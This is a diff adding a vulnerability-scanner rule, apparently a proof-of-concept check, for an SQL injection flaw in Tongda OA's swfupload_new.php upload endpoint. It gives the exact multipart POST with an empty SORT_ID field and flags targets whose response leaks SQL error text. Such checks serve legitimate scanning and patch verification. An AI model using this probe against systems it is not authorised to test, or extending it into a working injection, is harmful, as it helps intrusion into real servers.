@@ -1,0 +1,27 @@
+name: tongda-swfupload-new-sq
+rules:
+  r0:
+    request:
+      method: POST
+      path: /general/file_folder/swfupload_new.php
+      headers:
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+      body: |
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+
+        ------------GFioQpMK0vv2--
+    expression: response.status == 200 && response.body.bcontains(b'insert into FILE_CONTENT(')
+expression: r0()
